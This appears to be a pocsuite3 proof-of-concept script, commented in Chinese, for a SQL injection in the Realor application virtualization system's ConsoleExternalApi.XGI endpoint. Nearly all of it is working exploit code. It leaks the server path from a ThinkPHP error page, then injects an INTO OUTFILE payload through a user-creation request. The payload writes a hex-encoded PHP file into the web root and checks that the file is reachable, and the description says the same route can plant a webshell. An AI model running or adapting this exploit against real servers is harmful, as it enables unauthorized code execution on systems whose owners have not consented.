#!/usr/bin/env python
# coding: utf-8
from collections import OrderedDict
from urllib.parse import urljoin
import re,random,hashlib,base64
from pocsuite3.api import POCBase, Output, register_poc, logger, requests, OptDict, OptString, VUL_TYPE
from pocsuite3.api import REVERSE_PAYLOAD, POC_CATEGORY


class POC(POCBase):
    vulID = '0'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1'  #默认为1
    author = ['']  #  PoC作者的大名
    vulDate = '2023-04-24'  #漏洞公开的时间,不知道就写今天
    createDate = '2023-04-24'  # 编写 PoC 的日期
    updateDate = '2023-04-24'  # PoC 更新的时间,默认和编写时间一样
    references = ['']  # 漏洞地址来源,0day不用写
    name = ''  # PoC 名称
    appPowerLink = 'http://www.realor.cn'  # 漏洞厂商主页地址
    appName = ''  # 漏洞应用名称
    appVersion = '''ALL'''  # 漏洞影响版本
    vulType = VUL_TYPE.SQL_INJECTION #漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        瑞友天翼应用虚拟化系统 ConsoleExternalApi.XGI页面user参数 存在SQL注入漏洞,可以写入webshell，导致getshell
    '''
  # 漏洞简要描述
    samples = ['']  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = ['']  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    pocDesc = '''
    检测:pocsuite -r .\poc++.py -u url(-f url.txt) --verify 
    '''
    category = POC_CATEGORY.EXPLOITS.REMOTE
    
    def path(self):
        url = self.url+'/index.php?s=!@#'
        resq = requests.get(url=url,timeout=10)
        pattern = re.compile(u'(?<=FILE:) .*(?=ThinkPHP)')
        path = pattern.search(resq.text).group(0)
        return path
    def _verify(self):
        result = {}
        # 获取绝对路径
        AP = self.path().replace('\\','/').replace(' ','',1)
        # 生成随机数
        num = str(random.randint(99999, 99999999))
        # mysql into outfile 写入随机名的测试文件
        payload = "' LIMIT 0,1 INTO OUTFILE '"+AP+"/"+num+".XGI' LINES TERMINATED BY 0x3C3F706870206563686F206D643528323333293B706870696E666F28293B756E6C696E6B285F5F46494C455F5F293B3F3E-- -"
        path_1 = "/ConsoleExternalApi.XGI?initParams=command_createUser__user_Admin__pwd_202cb962ac59075b964b07152d234b70&key=wusuokey&sign=e07d6d7a409f9c5a9fda8ebc559b14f2"
        data_1 = {"account":"test"+payload+"","userPwd":"202cb962ac59075b964b07152d234b70","ifAutoGenerateNtAccount":1}
        
        path_2 = '/'+num + '.XGI' #验证文件是否写入
        headers={
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'
        }
        
        
        try:
            resq_1 = requests.post(url=self.url+path_1,json=data_1,headers=headers,timeout=10)
            resq_2 = requests.get(url=self.url+path_2,headers=headers,timeout=10)
            if resq_1.status_code == 200 and  'e165421110ba03099a1c0393373c5b43' in resq_2.text :
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url + path_2
        except Exception as e:
            return
        return self.parse_output(result)         

    def _attack(self):
        return self._verify()
    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _shell(self):
        return

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
    
register_poc(POC)